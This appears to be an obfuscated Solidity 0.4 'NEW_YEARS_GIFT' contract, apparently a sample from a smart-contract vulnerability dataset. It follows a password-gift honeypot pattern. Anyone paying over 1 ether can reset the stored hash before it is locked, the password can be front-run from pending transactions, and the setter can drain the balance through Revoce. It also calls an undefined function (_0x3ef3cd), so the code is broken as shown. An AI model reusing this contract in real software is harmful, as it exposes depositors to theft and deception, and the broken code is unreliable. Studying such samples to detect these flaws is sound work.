// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract NEW_YEARS_GIFT
{
    string _0x775417;

    bool _0x253058 = false;

    address sender;

    bytes32 public _0x1fae2a;

    function() public payable{}

    function GetHash(bytes _0xa15967) public constant returns (bytes32) {
        uint256 _unused1 = 0;
        uint256 _unused2 = 0;return _0x3ef3cd(_0xa15967);}

    function SetPass(bytes32 _0xa7d6d0)
    public
    payable
    {
        bool _flag3 = false;
        bool _flag4 = false;
        if( (!_0x253058&&(msg.value > 1 ether)) || _0x1fae2a==0x0 )
        {
            _0x1fae2a = _0xa7d6d0;
            sender = msg.sender;
        }
    }

    function SetMessage(string _0x17cb41)
    public
    {
        if(msg.sender==sender)
        {
            _0x775417 =_0x17cb41;
        }
    }

    function GetGift(bytes _0xa15967)
    external
    payable
    returns (string)
    {
        if(_0x1fae2a == _0x3ef3cd(_0xa15967))
        {
            msg.sender.transfer(this.balance);
            return _0x775417;
        }
    }

    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
            _0x775417="";
        }
    }

    function PassHasBeenSet(bytes32 _0xa7d6d0)
    public
    {
        if(msg.sender==sender&&_0xa7d6d0==_0x1fae2a)
        {
           _0x253058=true;
        }
    }
}